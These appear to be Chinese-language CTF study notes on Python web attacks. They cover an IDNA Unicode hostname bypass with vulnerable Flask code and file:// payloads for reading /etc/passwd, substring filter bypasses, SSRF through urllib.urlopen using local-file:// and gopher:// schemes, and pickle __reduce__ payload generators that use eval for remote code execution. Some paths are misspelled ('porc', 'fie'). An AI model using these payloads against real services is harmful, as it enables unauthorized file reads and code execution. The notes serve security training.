程序目录可能：/app/appy.py
环境变量：/porc/self/version 里面可能有工作目录PWD
程序启动命令：/porc/self/cmdline



## **url中的unicode漏洞**
```
℆这个字符在经过
for h in host.split('.'):
      newhost.append(h.encode('idna').decode('utf-8'))
处理后变成c/u

以及ℂ变成c等
```

于是传入url=file://suctf.cc/etc/passwd
可以变成传入url=file://suℂtf.cc/etc/passwd绕过过滤，最终又变回来
>非预期这个也可绕过：url=file:////suctf.cc/etc/passwd
```
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"


    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host


    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()   #http读网站，file读本地文件
    else:
        return "我扌 your problem? 333"
```

^
## **字符绕过**
如果判断是：
if "scan" in self.action:
则action中含有scan字符即可通过。
一般是两种字符按顺序拼接一起可以绕过多个判断，如xx+readscan ，xxread+scan

^
## **请求参数**
flask：
param = urllib.unquote(request.args.get("param", ""))
获取param参数值，如果没有默认为第二个空。

^
## **读文件**
tmpfile = open("./%s" % self.sandbox, 'w')

^
get请求读远程网址中文件前50字节，可能造成ssrf：
urllib.urlopen(param).read()[:50]
使用urllib.urlopen(param) 包含文件，可以直接填写文件路径`./flag.txt`，也可以使用伪协议。

本地文件读取协议:
fie://
local-file://绝对路径 或 local-file://flag.txt
gopher://



^
## **python反序列化**
python中反序列化的库主要有两个，`pickle`和`cPickle`，这俩除了运行效率上有区别外，其他没啥区别
和php一样不光能序列化字符串，也可以序列化数组，字典，类


`pickle`的常用方法有
```
import pickle

a_list = ['a','b','c']

# pickle构造出的字符串，有很多个版本。在dumps或loads时，可以用Protocol参数指定协议版本，例如指定为0号版本
# 目前这些协议有0,2,3,4号版本，默认为3号版本。这所有版本中，0号版本是人类最可读的；
# 之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。
# 一个好消息是，pickle协议是向前兼容的。0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。
# pickle.dumps将对象序列化为字符串
# pickle.dump将序列化后的字符串存储为文件
print(pickle.dumps(a_list,protocol=0))

pickle.loads() #对象反序列化
pickle.load() #对象反序列化，从文件中读取数据
```


ctf中大多数常见的pickle反序列化，利用方法大都是`__reduce__`，实现RCE。
`__reduce__`这个魔术方法，这个魔术方法简单的来说可php的`__wakeup`差不多,就是在被序列化的时候告诉系统如何运行，
他的返回值第一个参数是函数名，第二个参数是一个tuple，为第一个函数的参数。
稍微有点区别在于我们能够控制里面的内容，而php的`__wakeup`则是目标环境写死的，说明python反序列化更加自由一些


```
# -*- coding: utf-8 -*-
# python2代码
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print(a) 
# 将生成的序列化串，传入反序列化进行RCE文件读取。
```

```
# Python 3代码
import pickle
import urllib.parse

class payload:
    def __reduce__(self):
        return (eval, ("open('flag.txt', 'r').read()",))

# Python 3中pickle.dumps()返回的是bytes类型，不需要urllib.quote进行编码
a = pickle.dumps(payload())

# Python 3中urllib.quote函数在urllib.parse模块中
a_quoted = urllib.parse.quote(a)  # 这里对bytes类型进行编码可能不是必要的
print(a_quoted)
# 将生成的序列化串，传入反序列化进行RCE文件读取。
```




